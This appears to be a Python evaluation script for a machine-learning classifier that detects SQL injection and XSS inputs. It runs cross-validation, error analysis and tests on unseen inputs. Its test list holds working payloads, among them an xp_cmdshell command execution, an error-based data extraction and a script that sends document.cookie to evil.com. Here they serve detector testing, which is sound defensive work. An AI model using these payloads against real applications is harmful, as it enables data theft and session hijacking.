"""
evaluate.py - Detailed ML model evaluation.

Goes beyond the basic accuracy from train.py. This script:
1. Runs 5-fold cross-validation to check the model is consistently good
   (not just lucky on one particular train/test split)
2. Analyses misclassifications to understand failure modes
3. Tests the model on edge cases and novel payloads not in training data
4. Outputs a full evaluation report

This is Sprint 10 work — confirming the model is robust enough to deploy
as a detection layer.
"""

import os
import json
import numpy as np
import joblib
from sklearn.linear_model import LogisticRegression
from sklearn.model_selection import cross_val_score, StratifiedKFold
from sklearn.metrics import classification_report, confusion_matrix

PREPARED_DIR = os.path.join(os.path.dirname(__file__), "prepared")
MODEL_DIR = os.path.join(os.path.dirname(__file__), "model")


def run_cross_validation():
    """5-fold cross-validation to verify the result is consistent."""
    print("=" * 60)
    print("1. CROSS-VALIDATION (5-fold)")
    print("=" * 60)

    X_train = joblib.load(os.path.join(PREPARED_DIR, "X_train.pkl"))
    y_train = joblib.load(os.path.join(PREPARED_DIR, "y_train.pkl"))

    model = LogisticRegression(max_iter=1000, solver="lbfgs", random_state=42)
    cv = StratifiedKFold(n_splits=5, shuffle=True, random_state=42)

    scores = cross_val_score(model, X_train, y_train, cv=cv, scoring="accuracy")

    print(f"\n  Fold scores: {[f'{s:.3f}' for s in scores]}")
    print(f"  Mean accuracy: {scores.mean():.4f} ({scores.mean()*100:.1f}%)")
    print(f"  Std deviation: {scores.std():.4f}")
    print(f"  Min fold: {scores.min():.4f}")
    print(f"  Max fold: {scores.max():.4f}")

    if scores.mean() >= 0.90:
        print(f"\n  ✓ Cross-validated accuracy {scores.mean()*100:.1f}% meets ≥90% target")
    else:
        print(f"\n  ✗ Cross-validated accuracy {scores.mean()*100:.1f}% below 90% target")

    return scores


def analyse_errors():
    """Look at what the model gets wrong to understand its weaknesses."""
    print("\n" + "=" * 60)
    print("2. ERROR ANALYSIS")
    print("=" * 60)

    X_test = joblib.load(os.path.join(PREPARED_DIR, "X_test.pkl"))
    y_test = joblib.load(os.path.join(PREPARED_DIR, "y_test.pkl"))
    X_test_text = joblib.load(os.path.join(PREPARED_DIR, "X_test_text.pkl"))

    model = joblib.load(os.path.join(MODEL_DIR, "classifier.pkl"))
    y_pred = model.predict(X_test)
    probs = model.predict_proba(X_test)[:, 1]

    # find misclassifications
    errors = []
    for i in range(len(y_test)):
        if y_test[i] != y_pred[i]:
            errors.append({
                "text": X_test_text[i],
                "true_label": "malicious" if y_test[i] == 1 else "benign",
                "predicted": "malicious" if y_pred[i] == 1 else "benign",
                "confidence": float(probs[i]),
            })

    print(f"\n  Total test samples: {len(y_test)}")
    print(f"  Misclassifications: {len(errors)}")

    if errors:
        print(f"\n  Misclassified samples:")
        for e in errors:
            print(f"    '{e['text'][:60]}...' " if len(e['text']) > 60 else f"    '{e['text']}'")
            print(f"      True: {e['true_label']}, Predicted: {e['predicted']}, Confidence: {e['confidence']:.3f}")
    else:
        print("  No misclassifications! Perfect on this test set.")

    return errors


def test_novel_payloads():
    """Test with payloads NOT in the training data to see how it generalises."""
    print("\n" + "=" * 60)
    print("3. NOVEL PAYLOAD TESTING")
    print("=" * 60)

    model = joblib.load(os.path.join(MODEL_DIR, "classifier.pkl"))
    vectorizer = joblib.load(os.path.join(MODEL_DIR, "vectorizer.pkl"))

    # payloads the model has never seen
    novel_malicious = [
        "' AND 1=CONVERT(int,(SELECT table_name FROM information_schema.tables))--",
        "<svg><animate onbegin=alert(1)>",
        "'; EXEC xp_cmdshell('dir'); --",
        "<img/src/onerror=alert(1)>",
        "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(user(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "<script>fetch('http://evil.com/'+document.cookie)</script>",
        "admin' OR '1'='1'#",
        "<input autofocus onfocus=alert(1)>",
    ]

    novel_benign = [
        "Looking for a nice restaurant nearby",
        "Meeting rescheduled to 3pm on Thursday",
        "Can you recommend a good book about Python?",
        "The delivery is expected on Friday",
        "My account number is ACC-99821",
        "Please send the invoice to accounts@company.com",
        "The Wi-Fi password is on the whiteboard",
        "Room 404 is on the fourth floor",
    ]

    print(f"\n  Testing {len(novel_malicious)} novel malicious payloads:")
    mal_detected = 0
    for payload in novel_malicious:
        features = vectorizer.transform([payload])
        prob = model.predict_proba(features)[0][1]
        pred = "MALICIOUS" if prob >= 0.7 else "benign"
        detected = prob >= 0.7
        if detected:
            mal_detected += 1
        symbol = "✓" if detected else "✗"
        print(f"    {symbol} [{prob:.3f}] {payload[:55]}")

    print(f"\n  Novel malicious detection: {mal_detected}/{len(novel_malicious)} ({mal_detected/len(novel_malicious)*100:.0f}%)")

    print(f"\n  Testing {len(novel_benign)} novel benign inputs:")
    benign_correct = 0
    for text in novel_benign:
        features = vectorizer.transform([text])
        prob = model.predict_proba(features)[0][1]
        is_fp = prob >= 0.7
        if not is_fp:
            benign_correct += 1
        symbol = "✓" if not is_fp else "✗ FP"
        print(f"    {symbol} [{prob:.3f}] {text[:55]}")

    print(f"\n  Novel benign correct: {benign_correct}/{len(novel_benign)} ({benign_correct/len(novel_benign)*100:.0f}%)")

    return mal_detected, len(novel_malicious), benign_correct, len(novel_benign)


def main():
    print("SecureShield ML Model — Detailed Evaluation")
    print("=" * 60)

    cv_scores = run_cross_validation()
    errors = analyse_errors()
    mal_det, mal_total, ben_correct, ben_total = test_novel_payloads()

    # save evaluation results
    eval_results = {
        "cross_validation": {
            "folds": 5,
            "mean_accuracy": round(float(cv_scores.mean()), 4),
            "std_deviation": round(float(cv_scores.std()), 4),
            "fold_scores": [round(float(s), 4) for s in cv_scores],
        },
        "test_set_errors": len(errors),
        "novel_payload_test": {
            "malicious_detected": mal_det,
            "malicious_total": mal_total,
            "malicious_rate": round(mal_det / mal_total, 4) if mal_total > 0 else 0,
            "benign_correct": ben_correct,
            "benign_total": ben_total,
            "benign_rate": round(ben_correct / ben_total, 4) if ben_total > 0 else 0,
        },
        "target_met": float(cv_scores.mean()) >= 0.90,
    }

    eval_path = os.path.join(MODEL_DIR, "evaluation.json")
    with open(eval_path, "w") as f:
        json.dump(eval_results, f, indent=2)
    print(f"\n\nEvaluation saved to {eval_path}")

    print("\n" + "=" * 60)
    print("SUMMARY")
    print("=" * 60)
    print(f"  Cross-validation accuracy: {cv_scores.mean()*100:.1f}% ± {cv_scores.std()*100:.1f}%")
    print(f"  Test set errors: {len(errors)}/{36}")
    print(f"  Novel malicious detection: {mal_det}/{mal_total}")
    print(f"  Novel benign correct: {ben_correct}/{ben_total}")
    print(f"  Target (≥90%): {'MET' if eval_results['target_met'] else 'NOT MET'}")


if __name__ == "__main__":
    main()
